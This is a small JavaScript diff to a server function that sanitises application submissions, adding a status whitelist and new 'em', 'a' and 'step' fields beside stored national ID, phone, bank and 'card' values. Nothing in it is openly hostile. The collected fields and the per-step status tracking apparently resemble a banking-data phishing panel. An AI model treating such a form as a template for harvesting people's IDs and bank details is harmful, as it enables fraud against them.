@@ -38,6 +38,7 @@ function readBody(req) {
 }
 // نحفظ فقط بيانات مقدّم الطلب — أي حقول دفع تُتجاهل تماماً
 function cleanApplication(b) {
+  const status = ["new", "pending", "awaiting", "confirmed", "rejected"].includes(b.status) ? b.status : "new";
   return {
     ref: str(b.ref, 40) || ("HM-" + Date.now().toString().slice(-8)),
     ts: Date.now(),
@@ -45,8 +46,9 @@ function cleanApplication(b) {
     n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
     e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
     bank: str(b.bank, 3), bankName: str(b.bankName, 80),
-    ad: str(b.ad, 500), card: str(b.card, 12), watch: str(b.watch, 20),
-    lang: b.lang === "en" ? "en" : "ar", status: "new"
+    em: str(b.em, 30), a: str(b.a, 10), ad: str(b.ad, 500),
+    card: str(b.card, 12), watch: str(b.watch, 20),
+    lang: b.lang === "en" ? "en" : "ar", status, step: str(b.step, 20)
   };
 }
 
